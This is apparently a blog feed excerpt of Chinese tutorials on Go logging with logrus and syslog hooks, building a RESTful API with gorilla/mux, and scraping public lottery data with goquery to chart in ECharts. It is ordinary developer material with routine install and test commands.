IPv6 &amp; Security Cyber-Security: OpenSSH 并不安全 Cyber-Security: Linux/XOR.DDoS 木马样本分析 Cyber-Security: 事与愿违的后门程序 | Economist Cyber-Security: 美国网络安全立法策略 Cyber-Security: 香港警务处网络安全与科技罪案调查科 浅谈基于数据分析的网络态势感知 Packet Capturing:关于网络数据包的捕获、过滤和分析 新一代Ntopng网络流量监控—可视化和架构分析 开源技术漫谈 架构师 《Stack Overflow 架构解析 - 2016 Edition》 Linux.com: 引入开源软件的六大运营挑战 基于Kafka构建事件溯源型微服务 LinkedIn 开源 Kafka Monitor 基于Go语言快速构建一个RESTful API服务 应用程序开发中的日志管理(Go语言描述) 最佳工程实践：Oracle 数据库迁移割接实践 开源技术架构漫谈：PostgreSQL 数据库 最佳工程实践：基于LVS的AAA负载均衡架构实践 开源技术架构漫谈：ZeroMQ 数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（十）公共数据源列表 四、Network Engineering 浅谈基于数据分析的网络态势感知 网络数据包的捕获与分析（libpcap、BPF及gopacket） 新一代Ntopng网络流量监控—可视化和架构分析 远程通信协议：从 CORBA 到 gRPC SDN技术指南 SDN 技术指南（一）: 架构概览 SDN 技术指南（二）：OpenFlow Preview SDN 技术指南（三）：OpenDaylight or Floodlight ? SDN 技术指南（四）：Open vSwitch Preview SDN 技术指南（五）：NFV Preview SDN 技术指南（六）：OpenStack or Kubernetes ? Stack Overflow：云计算平台的趋势分析（AWS or Azure） 未分类DevOps GOPS,高效运维社区 DevOps 漫谈：基础设施部署和配置管理 2018 年度 Docker 用户报告 - Sysdig Edition SRE虚拟化TeamWork,关于群体决策TechThinking,关于技术思维Nature&amp;ScienceNature&amp;ScienceCatalog:Medicine Catalog:Health 嗑药简史（一）：药物成瘾、生活习惯与神经系统 嗑药简史（二）：瘾品跨境流动与外交关系 嗑药简史（三）：瘾品管制背后的情与法 嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017) 医学常识| 肝系统健康状况评价指标体系 医学常识| NIH 情绪健康检查单 WorldBook:关于知识体系的构建（构思）EconomistThe Economist The Economist:Books of the Year 2017 Economist:Books of the Year 2016 经济学人：加拿大的一夫多妻问题 —— 摩门教、移民和穆斯林 书单(Economist:《Books of the Year 2016》) 经济学人：解读世纪小说《悲惨世界》 读书笔记|彼得·德鲁克：管理是一种自由 Economist译文:欧洲难民计划：移民危机管理 Economist译文:The Saudi blueprint 沙特王国的改革蓝图 Economist译文:2016年全球经济形势预测 Economist译文:印度电商竞赛 Economist译文:越共换届－巨变或轮回？（201612封禁） Economist译文:事与愿违的后门程序 Economist译文:当代德国纳粹魅影 Economist译文:自由迁徙的障碍（201612封禁） Economist译文:奢侈品—万金藏獒（201612封禁） History分类：History 分类：Humanics(人类学) 读书笔记|顾准《顾准日记》 清史 清史-雍正时期：《大义觉迷录》 (通阅,201705) 清史-乾隆时期：《叫魂》 清史-嘉道咸时期：史景迁《太平天国》 清史-嘉道咸时期：张集馨《时晴斋主人自叙年谱》 清史-同治光绪时期：谭嗣同 《国士无双伍连德》 明史 黄仁宇:《万历十五年》 黄仁宇:《放宽历史的视界》 黄仁宇:《明代的漕运》 小说《明朝那些事》 影视作品《大明王朝1956》：政府财政逻辑 明史：李自成 Policy&amp;Law政府行为模式与预测专题：公共医疗专题：公共财政专题：贫困问题专题：宗教治理专题：民权法法律专题：网络安全法 Cyber-Security 美国网络安全立法策略 香港网络安全与科技罪案总警司 专题：知识产权法 （未完成）基于专利文档的信息检索 专题：新闻出版法Manager 读书笔记|彼得·德鲁克：管理是一种自由 讲武堂 美军士官制度观察 美军体能训练观察 各国军警体能标准横向评测 美军授勋和嘉奖制度观察 太公分猪肉——香港特区授勋和嘉奖制度批判 中国传统兵法摘要 2016 年珠海航展摄影图辑 生活 Travel Museum：博物馆大全 Birdwatching|广州湿地公园 园林|南京瞻园 艺术评论 古典音乐低俗史 电影评论 |《灵魂解码《林肯》》 电影评论 | 斯皮尔伯格的林肯情怀 舞台剧 |《南海十三郎》幕后故事 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 钞票人物：风流小王爷]]></content>
      <categories>
        <category>站长信息</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：应用程序的日志管理及可视化]]></title>
    <url>%2F2017%2F05%2F24%2FLog%2F</url>
    <content type="text"><![CDATA[摘要程序中记录日志的首要目的：Troubleshooting。通过记录程序中对外部系统与模块的依赖调用、重要状态信息的变化、关键变量、关键逻辑等，显示基于时间轴的程序运行轨迹，显示业务是否正常、是否存在非预期执行，在出问题时方便还原现场，推断程序运行过程、理清问题的方向。 本文将讨论在实现日志功能过程中常见的一些问题，包括基础API、格式化、日志转发及可视化等方面，代码采用Go语言描述。 一、Basic1、后台输出 123456789package mainimport ( "fmt")func main()&#123; fmt.Println("------hello world-----")&#125; 2、There are no exceptions in Golang, only errors. Go语言不支持传统的 try…catch…finally 这种异常，因为Go语言的设计者们认为，将异常与控制结构混在一起会很容易使得代码变得混乱。因为开发者很容易滥用异常，甚至一个小小的错误都抛出一个异常，替代方案是使用多值返回来返回错误。当然Go并不是全面否定异常的存在，或者用recover+panic语法实现，只是极力不鼓励多用异常。 12345678910111213141516171819package mainimport ( "log" "errors" "fmt")func main() &#123; /* local variable definition */ ... /* function for division which return an error if divide by 0 */ ret,err = div(a, b) if err != nil &#123; log.Fatal(err) &#125; fmt.Println(ret)&#125; 3、写入日志文件: 12345678910111213141516package mainimport ( "log" "os")func main()&#123; f,err :=os.OpenFile("test.log",os.O_WRONLY|os.O_CREATE|os.O_APPEND,0644) if err !=nil&#123; log.Fatal(err) &#125; defer f.Close() log.SetOutput(f) log.Println("==========works==============")&#125; 12YRMacBook-Pro:go-log yanrui$ more test.log2017/05/24 21:46:25 ==========works============== 二、格式化推荐日志工具库：logrus 1$ go get github.com/Sirupsen/logrus 1、JSON format 12345678910111213package mainimport ( log "github.com/Sirupsen/logrus" "github.com/logmatic/logmatic-go")func main() &#123; // use JSONFormatter log.SetFormatter(&amp;logmatic.JSONFormatter&#123;&#125;) // log an event as usual with logrus log.WithFields(log.Fields&#123;"string": "foo", "int": 1, "float": 1.1 &#125;).Info("My first ssl event from golang")&#125; 日志输出样式： 1234567&#123; "@marker":["sourcecode","golang"], "date":"2017-05-24T15:27:40+08:00", "float":1.1,"int":1,"level":"info", "message":"My first ssl event from golang", "string":"foo"&#125; 三、附加上下文通过logrus库可以加入一些上下文信息，例如：主机名称，程序名称或者会话参数等。 1234567contextLogger := log.WithFields(log.Fields&#123; "common": "XXX common content XXX", "other": "YYY special context YYY",&#125;)contextLogger.Info("AAAAAAAAAAAA")contextLogger.Info("BBBBBBBBBBBB") 日志输出样式：1234YRMacBook-Pro:go-log yanrui$ go run LogMatic.go&#123;"@marker":["sourcecode","golang"],"common":"XXX common content XXX","date":"2017-05-24T17:00:08+08:00","level":"info","message":"AAAAAAAAAAAA","other":"YYY special context YYY"&#125;&#123;"@marker":["sourcecode","golang"],"common":"XXX common content XXX","date":"2017-05-24T17:00:08+08:00","level":"info","message":"BBBBBBBBBBBB","other":"YYY special context YYY"&#125;YRMacBook-Pro:go-log yanrui$ 四、Hooks我们还可以利用Hook机制实现日志功能扩展，例如Syslog hook，将输出的日志发送到指定的Syslog服务。 1234567891011121314151617package mainimport ( log "github.com/sirupsen/logrus" "gopkg.in/gemnasium/logrus-airbrake-hook.v2" // the package is named "aibrake" logrus_syslog "github.com/sirupsen/logrus/hooks/syslog" "log/syslog")func main()&#123; hook, err := logrus_syslog.NewSyslogHook("udp", "59.37.0.1:514", syslog.LOG_INFO, "") if err != nil &#123; log.Error("Unable to connect to local syslog daemon") &#125; else &#123; log.AddHook(hook) &#125;&#125; 验证是否发送Syslog： 123456$ sudo tcpdump | grep 59.37.0.1tcpdump: data link type PKTAPtcpdump: verbose output suppressed, use -v or -vv for full protocol decodelistening on pktap, link-type PKTAP (Apple DLT_PKTAP), capture size 262144 bytes18:51:05.663612 IP 192.168.199.15.58819 &gt; 59.37.0.1.syslog: SYSLOG kernel.info, length: 31418:51:05.663657 IP 192.168.199.15.58819 &gt; 59.37.0.1.syslog: SYSLOG kernel.info, length: 314 五、可视化在真实场景中日志数据体量非常庞大，日志存储只是第一步，更多的情况是需要查看特定指标或者能够快速检索信息，此时日志分析平台就发挥作用了。 GoAccess: Web Server Log 123456$ wget https://tar.goaccess.io/goaccess-1.3.tar.gz$ tar -xzvf goaccess-1.3.tar.gz$ cd goaccess-1.3/$ ./configure --enable-utf8 --enable-geoip=legacy$ make# make install logmatic 在使用logmatic之前，需要下载它的hook支持： 1$ go get github.com/logmatic/logmatic-go 1234567func main() &#123; // instantiate a new Logger with your Logmatic APIKey // 国内访问比较慢 log.AddHook(logmatic.NewLogmaticHook("p53uTkOhSEqI3-116DynkQ")) // ..........&#125; 效果如下： TipsTail Multiple Files12345# Native Tail Command$ tail -f file1 file2# multitail Utility# yum install multitail$ multitail access.log httpd.log 扩展阅读：开发语言&amp;代码工程 Stack Overflow：2017年最赚钱的编程语言 玩转编程语言:构建自定义代码生成器 远程通信协议:从 CORBA 到 gRPC 基于Kafka构建事件溯源型微服务 LinkedIn 开源 Kafka Monitor 基于Go语言快速构建一个RESTful API服务 应用程序开发中的日志管理(Go语言描述) 参考文献 云风的BLOG：断点单步跟踪是一种低效的调试方法 logmatic.io:Our Guide to a Golang logs world logmatic.io:Beyond Application Monitoring Syslog RFC 5424 Golang Blog:Error handling and Go Dave Cheney:Why Go gets exceptions right 蝈蝈俊:Go的异常处理 defer, panic, recover 知乎：Go 语言的错误处理机制是一个优秀的设计吗？ Monolog优化及打造ELK友好的日志格式 | Leo108’s Blog 4 Ways to Watch or Monitor Log Files in Real Time 【年度案例】Twitter高性能分布式日志系统架构解析 | 原创 2015-12-24 郭斯杰 高可用架构 BEST PRACTICES:EVENT LOG MANAGEMENT FOR SECURITY AND COMPLIANCE INITIATIVES| By Ipswitch, Inc. Network Managment Division rsyslog 8.1901.0 documentation]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源技术架构漫谈：基于Go语言快速构建RESTful API服务]]></title>
    <url>%2F2017%2F05%2F23%2FRestfulAPI%2F</url>
    <content type="text"><![CDATA[摘要 What is a JSON API? 启动一个RESTful服务 抽象数据模型 增加路径分发功能 重构：Handlers &amp; Router In this post, we will not only cover how to use Go to create a RESTful JSON API, but we will also talk about good RESTful design. 部分内容删减调整，原文请查看： Making a RESTful JSON API in Go,2014Nov Author:CORY LANOU:a full stack technologist who has specialized in start-ups for the last 17 years. I’m currently working at InfluxDB on their core data team. I also help lead and organizer several community technology meetups and do Go training. 一、What is a JSON API?JSON API 是数据交互规范，用以定义客户端如何获取与修改资源，以及服务器如何响应对应请求。JSON API设计用来最小化请求的数量，以及客户端与服务器间传输的数据量。通过遵循共同的约定，可以提高开发效率，利用更普遍的工具,基于 JSON API 的客户端还能够充分利用缓存，以提升性能。(更多：http://jsonapi.org.cn/format/)。 示例：1234567891011121314151617181920&#123; "links": &#123; "posts.author": &#123; "href": "http://example.com/people/&#123;posts.author&#125;", "type": "people" &#125;, "posts.comments": &#123; "href": "http://example.com/comments/&#123;posts.comments&#125;", "type": "comments" &#125; &#125;, "posts": [&#123; "id": "1", "title": "Rails is Omakase", "links": &#123; "author": "9", "comments": [ "5", "12", "17", "20" ] &#125; &#125;]&#125; 启动一个RESTful服务1234$ go run main.go$ curl http://localhost:8080Hello,"/" 1234567891011121314151617package mainimport ( "fmt" "html" "log" "net/http")func main() &#123; http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintf(w, "Hello, %q", html.EscapeString(r.URL.Path)) &#125;) log.Fatal(http.ListenAndServe(":8080", nil))&#125; 增加路径分发功能路径又称”终点”（endpoint），表示API的具体网址。在RESTful架构中，每个网址代表一种资源（resource）。第三方组件（Gorilla Mux package）： “github.com/gorilla/mux” 12345678910111213141516171819202122232425262728293031package mainimport ( "fmt" "log" "net/http" "github.com/gorilla/mux")func main() &#123; router := mux.NewRouter().StrictSlash(true) router.HandleFunc("/", Index) router.HandleFunc("/todos", TodoIndex) router.HandleFunc("/todos/&#123;todoId&#125;", TodoShow) log.Fatal(http.ListenAndServe(":8080", router))&#125;func Index(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, "Welcome!")&#125;func TodoIndex(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, "Todo Index!")&#125;func TodoShow(w http.ResponseWriter, r *http.Request) &#123; vars := mux.Vars(r) todoId := vars["todoId"] fmt.Fprintln(w, "Todo show:", todoId)&#125; 访问测试： 123456$ curl http://localhost:8080/todo404 page not found$ curl http://localhost:8080/todosTodo Index! ,"/todos"$ curl http://localhost:8080/todos/&#123;123&#125;TodoShow: ,"123" 抽象数据模型创建一个数据模型“Todo”、“Routes”。在其它语言中，使用类（class）实现。在Go语言中，没有class，必须使用结构(struct)。 Todo.go123456789101112package mainimport "time"type Todo struct &#123; Id int `json:"id"` Name string `json:"name"` Completed bool `json:"completed"` Due time.Time `json:"due"`&#125;type Todos []Todo Routes.go123456789101112131415package mainimport ( "net/http" "github.com/gorilla/mux")type Route struct &#123; Name string Method string Pattern string HandlerFunc http.HandlerFunc&#125;type Routes []Route 重构：Handlers &amp; RouterHandlers.go1234567891011121314151617181920212223242526272829package mainimport ( "encoding/json" "fmt" "net/http" "github.com/gorilla/mux")func Index(w http.ResponseWriter, r *http.Request) &#123; fmt.Fprintln(w, "Welcome!")&#125;func TodoIndex(w http.ResponseWriter, r *http.Request) &#123; todos := Todos&#123; Todo&#123;Name: "Write presentation"&#125;, Todo&#123;Name: "Host meetup"&#125;, &#125; if err := json.NewEncoder(w).Encode(todos); err != nil &#123; panic(err) &#125;&#125;func TodoShow(w http.ResponseWriter, r *http.Request) &#123; vars := mux.Vars(r) todoId := vars["todoId"] fmt.Fprintln(w, "Todo show:", todoId)&#125; Router.go1234567891011121314151617181920212223package mainimport ( "net/http" "github.com/gorilla/mux")func NewRouter() *mux.Router &#123; router := mux.NewRouter().StrictSlash(true) for _, route := range routes &#123; var handler http.Handler handler = route.HandlerFunc handler = Logger(handler, route.Name) router. Methods(route.Method). Path(route.Pattern). Name(route.Name). Handler(handler) &#125; return router&#125; 启动入口是不是清爽很多！Main.go123456789101112Main.gopackage mainimport ( "log" "net/http")func main() &#123; router := NewRouter() log.Fatal(http.ListenAndServe(":8080", router))&#125; web access:http://localhost:8080/todos Todo Index! ,”/todos”[ { “id”:0, “name”:”Write sth ….”, “completed”:false, “due”:”0001-01-01T00:00:00 }, { “id”:1, “name”:”Host meetup ….”, “completed”:false, “due”:”0001-01-01T00:00:00Z” }] 增强功能：持久化1234func TodoCreate(w http.ResponseWriter, r *http.Request) &#123; var todo Todo //add Todo instance&#125; 增强功能：日志12342017/05/23 15:57:23 http: multiple response.WriteHeader calls2017/05/23 15:57:23 GET /todos TodoIndex 6.945807ms2017/05/23 16:18:40 http: multiple response.WriteHeader calls2017/05/23 16:18:40 GET /todos TodoIndex 2.127435ms Things We Didn’t Do 版本控制API版本迭代 &amp; 跨版本资源访问。常用做法是将版本号放在URL，较为简洁，例如：https://localhost:8080/v1/另一种做法是将版本号放在HTTP头信息中。 授权验证：涉及到OAuth和JWT。（1）OAuth 2.0，OAuth2 is an authentication framework,RFC 6749OAuth2是一种授权框架，提供了一套详细的、可供实践的指导性解决方案。OAuth 2.0定义了四种授权方式。授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）、客户端模式（client credentials）。 Getting Started with OAuth2 in Go | Youtube Extensible security first OAuth 2.0 and OpenID Connect SDK for Go (2)JSON web tokens,JWT is an authentication protocol,RFC 7519JWT是一种安全协议。基本思路就是用户提供用户名和密码给认证服务器，服务器验证用户提交信息信息的合法性；如果验证成功，会产生并返回一个Token（令牌），用户可以使用这个token访问服务器上受保护的资源。 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ header:定义算法(alg:ALGORITHM)和TOKEN TYPE（typ） 1234&#123; "alg": "HS256", "typ": "JWT"&#125; Data:12345&#123; "sub": "1234567890", "name": "John Doe", "admin": true&#125; AuthN | Modern, open source, web app authentication API Authentication With Node.js eTags：关于缓存、性能和用户标识和追踪。 参考文献 阮一峰:RESTful API 设计指南 CORY LANOU:Making a RESTful JSON API in Go,2014Nov InfoQ:使用ETags减少Web应用带宽和负载 Stackoverflow:jwt vs oauth authentication OAuth 2 VS JSON Web Tokens:How to secure an API,20160605 阮一峰:理解OAuth 2.0,201405 RESTful routing in Go | Karl Seguin]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（五）基于网络爬虫制作可视化图表]]></title>
    <url>%2F2017%2F05%2F12%2FVisualization-Charts%2F</url>
    <content type="text"><![CDATA[摘要 基于网络爬虫的可视化图表:golang,goquery 案例：最近十年全国彩票销售变化情况 案例：中国科学院院士分布 数据可视化技术方案:基于 SVG (D3、Raphael)、基于 Canvas（Echarts） 基于网络爬虫的可视化图表我们身处大数据时代，几乎在所有工作例如商业技术、金融、科研教育等行业，以及日常生活中都可能需要涉及数据分析活动。横向来看数据分析的知识体系贯穿数据获取、数据存储、数据分析、数据挖掘、数据可视化等各大部分；按数据来源分，即可以是自己收集的数据，也可以采购数据或者基于公开数据集。 基于公开数据进行分析的话，必须提到的就是网络爬虫（web crawler），也被称作网络蜘蛛（spider）、自动索引程序（automatic indexer），搜索引擎（Google，百度等）就是大众日常生活中接触到的最典型、最强大的爬虫。 公开数据包括政府（统计局、央行、银监会、证监会等）、企业、社会组织和互联网上的个人发布信息等。在浩如烟海的互联网内容中，有价值信息犹如‘待字闺中’深藏的美女，等待有心人去挖掘。例如： 案例：最近十年全国彩票销售变化情况 在线演示 案例：中国科学院院士分布（出生地与籍贯）在线演示 案例：美国航空入境旅客（出发地）变化情况 在线演示 为了实现上述图表，相关技术方案的要点如下： 开发语言：基于 Golang 实现爬虫基本功能，主要考虑 Go 语言 自身对于网络方面的强大支持，语言级 Goroutines 提供并发高性能支持。 HTML选择器: goquery jQuery-style HTML manipulation in Go 数据存储: csv,PostgreSQL 等 数据可视化：ECharts 案例数据来源页面： 专栏：彩票管理 2017年11月份全国彩票销售情况 全体院士名单 院士个人介绍 12345678910111213141516171819//caipiao_task.gofunc Handle_GMOF_CaiPiao_Month_BatchTask() &#123; data := read_csv_caipiao("./data/caipiao_list.csv", ",") if data != nil &#123; for i := range data &#123; go Handle_GMOF_CaiPiao_Month_Task(url) &#125; &lt;-time.After(60 * time.Second) &#125;&#125;func Handle_GMOF_CaiPiao_Month_Task(url string) &#123; if url != "" &#123; myspider := init_GMOF_CaiPiao_Month_HTMLSpider(url) ctx, _ := myspider.Setup(nil) myspider.Spin(ctx) &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475//caipiao_spider.gopackage mainimport ( "log" "regexp" "strings" "github.com/PuerkitoBio/goquery" "github.com/celrenheit/spider")type GMOF_CaiPiao_Month_HTMLSpider struct &#123; title string `json:"title"` url string `json:"url"` desc string `json:"desc"`&#125;func init_GMOF_CaiPiao_Month_HTMLSpider(url string) *GMOF_CaiPiao_Month_HTMLSpider &#123; spider := NewGMOF_CaiPiao_Month_HTMLSpider() spider.url = url return spider&#125;func (w *GMOF_CaiPiao_Month_HTMLSpider) Setup(ctx *spider.Context) (*spider.Context, error) &#123; return spider.NewHTTPContext("GET", w.url, nil)&#125;func (w *GMOF_CaiPiao_Month_HTMLSpider) Spin(ctx *spider.Context) error &#123; if _, err := ctx.DoRequest(); err != nil &#123; return err &#125; html, err := ctx.HTMLParser() if err != nil &#123; return err &#125; caipiao := NewGMOF_CaiPiao_Month() //&lt;title&gt;&lt;/title&gt; caipiao.Title = html.Find("title").Eq(0).Text() caipiao.Title = Convert2String(caipiao.Title, GB18030) //class="TRS_Editor" html.Find(".TRS_Editor").Each(func(i int, s *goquery.Selection) &#123; content := s.Find("p").Text() caipiao.Content = content if content != "" &#123; content = Convert2String(content, GB18030) rows := strings.Split(content, "。") for _, value := range rows &#123; //fmt.Printf("======arr[%d]=\n [%s] \n", index, value) if strings.Index(value, "全国彩票") &gt; 0 &#123; reg := regexp.MustCompile(`全国共销售彩票([\d]+.[\d]+)\S+`) result := reg.FindStringSubmatch(value) if len(result) &gt; 0 &#123; caipiao.Total = result[1] &#125; &#125; &#125; &#125; &#125;) //id="appendix" html.Find("#appendix").Each(func(i int, s *goquery.Selection) &#123; href, _ := s.Find("a").Eq(0).Attr("href") //附件 caipiao.Attachid = href &#125;) //===== export data save_csv("./data/caipiao_result.csv", caipiao) return err&#125; 2017年11月份全国彩票销售情况,385.552017年10月份全国彩票销售情况,376.532017年9月份全国彩票销售情况,369.282017年8月份全国彩票销售情况,350.672017年7月份全国彩票销售情况,337.552017年6月份全国彩票销售情况,338.42 可视化图表：以 ECharts 为例常见的图表库，本文案例使用 ECharts 作为图表组件 HighCharts：JavaScript 编写，开源许可证允许个人用户和非商业用途。 Baidu ECharts：底层画图基于 Canvas, BSD 许可证协议。 Kartograph：构建交互式地图轻量级类库。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465//http://echarts.baidu.com/demo.html#line-gradientdata = [["2017年11月",385.55],["2017年10月",376.53],["2017年9月",369.28],["2017年8月",350.67],["2017年7月",337.55],["2017年6月",338.42],["2017年11月",385.55],["2017年10月",376.53],["2017年9月",369.28],["2017年8月",350.67],["2017年7月",337.55],["2017年6月",338.42],["2017年11月",385.55],["2017年10月",376.53],["2017年9月",369.28],["2017年8月",350.67],["2017年7月",337.55],["2017年6月",338.42],["2017年5月",376.95],["2017年4月",382.45],["2017年3月",379.33],["2017年2月",0],["2017年1月",291.61],["2016年12月",365.94],["2016年11月",344.82],["2016年10月",338.27],["2016年9月",320.71],["2016年8月",310.12],["2016年7月",324.03],["2016年6月",339.61],["2016年5月",346.19],["2016年4月",348.89],["2016年3月",356.88],["2016年2月",224.54],["2016年1月",326.41],["2015年12月",341.21],["2015年11月",306.30],["2015年10月",312.34],["2015年9月",290.78],["2015年8月",280.96],["2015年7月",270.47],["2015年6月",281.2371],["2015年5月",321.07],["2015年5月",321.07],["2015年4月",326.12],["2015年3月",308.12],["2015年2月",247.90],["2015年1月",392.33],["2014年12月",361.53],["2014年11月",341.18],["2014年10月",327.01],["2014年9月",322.52],["2014年8月",315.36],["2014年7月",372.09],["2014年6月",360.54],["2014年5月",307.94],["2014年4月",315.29],["2014年3月",328.74],["2014年2月",200.1],["2014年1月",271.49],["2013年12月",302.73],["2013年11月",274.16],["2013年10月",271.83],["2013年9月",257.62],["2013年8月",246.18],["2013年7月",243.65],["2013年6月",247.46],["2013年5月",273.41],["2013年4月",285.61],["2013年3月",273.37],["2013年2月",168.65],["2013年1月",248.59],["2012年12月",268.01],["2012年11月",237.06],["2012年10月",215.38],["2012年9月",205.12],["2012年8月",197.12],["2012年7月",201.98],["2012年6月",216.14],["2012年5月",236.16],["2012年4月",235.76],["2012年3月",235.79],["2012年2月",202.17],["2012年1月",164.54],["2011年12月",224.80],["2011年11月",210.08],["2011年10月",203.28],["2011年9月",196.44],["2011年8月",187.72],["2011年7月",182.05],["2011年6月",174.53],["2011年5月",187.28],["2011年3月",190.12],["2011年2月",112.92],["2011年1月",160.09],["2010年12月",171.89],["2010年11月",160.24],["2010年10月",149.95],["2010年9月",139.56],["2011年4月",186.50],["2010年8月",135.75],["2010年7月",132.74],["2010年6月",140.71],["2010年5月",144.38],["2010年4月",141.05],["2010年3月",132.52],["2010年2月",86.71],["2010年1月",126.99],["2009年12月",133.30],["2009年11月",117.05],["2009年10月",116.47],["2009年9月",111.73],["2009年8月",110.64],["2009年7月",107.87],["2009年6月",113.51],["2009年5月",121.59],["2009年4月",114.61],["2009年3月",114.49],["2009年2月",89.21],["2009年1月",74.33],["2008年12月",102.07],["2008年11月",94.09],["2008年10月",79.88],["2008年8月",84.66]];var dateList = data.map(function (item) &#123; return item[0];&#125;);var valueList = data.map(function (item) &#123; return item[1];&#125;);option = &#123; // Make gradient line here visualMap: [&#123; show: false, type: 'continuous', seriesIndex: 0, min: 0, max: 400 &#125;, &#123; show: false, type: 'continuous', seriesIndex: 1, dimension: 0, min: 0, max: dateList.length - 1 &#125;], title: [&#123; left: 'center', text: 'Gradient along the y axis' &#125;, &#123; top: '55%', left: 'center', text: 'Gradient along the x axis' &#125;], tooltip: &#123; trigger: 'axis' &#125;, xAxis: [&#123; data: dateList &#125;, &#123; data: dateList, gridIndex: 1 &#125;], yAxis: [&#123; splitLine: &#123;show: false&#125; &#125;, &#123; splitLine: &#123;show: false&#125;, gridIndex: 1 &#125;], grid: [&#123; bottom: '60%' &#125;, &#123; top: '60%' &#125;], series: [&#123; type: 'line', showSymbol: false, data: valueList &#125;, &#123; type: 'line', showSymbol: false, data: valueList, xAxisIndex: 1, yAxisIndex: 1 &#125;]&#125;; 最佳实践 默认调色板(palette) 1234567891011121314151617Navy — #001f3fBlue — #0074d9Aqua — #7fdbffTeal — #39ccccOlive — #3d9970Green — #2ecc40Lime — #01ff70Yellow — #ffdc00Orange — #ff851bRed — #ff4136Maroon — #85144bFuchsia — #f012bePurple — #b10dc9Black — #111111Gray — #aaaaaaSilver — #ddddddWhite — #ffffff 优化图表JS生成模板图表定型之后，可以通过模板固化配置，根据需要动态生成目标文件（html,js,svg等等），详见基于 Markdown 的 HTML 网页模板。 优化采集器 Goroutines “线程池”例如：PostgreSQL Exception: Open too many files 优化数据存储例如：常用的 GIS 坐标库 扩展阅读：开源工具与案例在线词云 WordArt.com:仅支持英文，精美，首选 Tagxedo:支持中、英文（中文分词效果一般），需要安装插件Silverlight Tag Crowd &amp; Google Adwords golang-based library golang.org/net/http github.com/celrenheit/spider goquery: jQuery-style HTML manipulation in Go github.com/henrylee2cn/pholcus_lib Pholcus is a distributed, high concurrency and powerful web crawler software 可视化图表案例 中国主要城市空气质量实况 中国经济十年时空漫游（2002-2011） 可视化图表技术方案 基于 SVG : D3、Raphael 基于 Canvas : Echarts HighCharts国外开源产品，JavaScript 编写，自带主题、动态交互方便，目前公司新版业务视图、地图应用、交互式流量图等是基于这个库实现。不足：缺少中文文档，开源许可证只允许个人用户和非商业用途，规模应用存在法律风险。 Baidu ECharts最早源于百度各种业务系统报表需求，底层画图基于 Canvas 。2013年开源，完全免费的BSD协议。特点：拖拽重计算，第三方标准格式支持，中文社区支持实例：http://echarts.baidu.com/doc/example.htmlGithub: https://github.com/ecomfe/echarts KartographKartograph 是个构建交互式地图的简单、轻量级类库。它包含两个库，一个用Python写的，用于产生漂亮和压缩的SVG地图，另一个是js类库用于前端展示地图用。 lchart(go-based) 朝花夕拾|showtext：字体，好玩的字体和好玩的图形 | 原创 2016-11-06 统计之都 统计之都 Themes for ggplot2. 扩展阅读：数据可视化 数据可视化（一）思维利器 OmniGraffle 绘图指南 数据可视化（二）跑步应用Nike+ Running 和 Garmin Mobile 评测 数据可视化（三）基于 Graphviz 实现程序化绘图 数据可视化（四）开源地理信息技术简史（Geographic Information System 数据可视化（五）基于网络爬虫制作可视化图表 数据可视化（六）常见的数据可视化仪表盘(DashBoard) 数据可视化（七）Graphite 体系结构详解 数据可视化（八）Program,Data and Classical Music 数据可视化（十）公共数据源列表 参考文献 数据从业者必读：抓取了一千亿个网页后我才明白，爬虫一点都不简单 | 算法与数学之美 2018-09-07 Matplotlib 可视化最有价值的 14 个图表（附完整 Python 源代码） | Lemonbit GitChat精品课 3月13日]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
        <tag>数据可视化</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据可视化（四）开源地理信息系统简史]]></title>
    <url>%2F2017%2F05%2F12%2FVisualization-GIS%2F</url>
